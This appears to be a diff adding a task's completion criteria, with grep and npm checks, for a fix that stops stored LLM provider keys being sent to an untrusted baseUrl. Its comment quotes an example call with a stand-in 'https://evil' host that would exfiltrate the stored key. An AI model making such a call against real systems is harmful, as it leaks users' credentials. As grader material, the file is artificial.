@@ -1,0 +1,11 @@
+{
+  "$comment": "Completion bar for #21: providers:test / fetchModels accepted a draft with an id/presetId and ANY baseUrl, and draftKey fell back to the saved/env key — so a compromised renderer could call test({id:'openai', baseUrl:'https://evil'}) with a blank key and the stored key would be sent there, breaking the write-only-keys guarantee. Fix: reuse a stored key only when the draft baseUrl equals the saved baseUrl (or the preset default); otherwise require re-entry. Criterion 1 fails before the change (trustedBaseUrl did not exist); 2 covers the new 'changed baseUrl never receives the stored key' test in test:providers; 3-5 guard typecheck, build, and the rest of the suite.",
+  "authority_id": "21",
+  "criteria": [
+    { "check": "command_exit", "target": "grep -q \"trustedBaseUrl\" electron/llm.ts" },
+    { "check": "tests_pass", "target": "npm run test:providers" },
+    { "check": "command_exit", "target": "npm run typecheck" },
+    { "check": "command_exit", "target": "npm run build" },
+    { "check": "tests_pass", "target": "npm run test:mvp" }
+  ]
+}
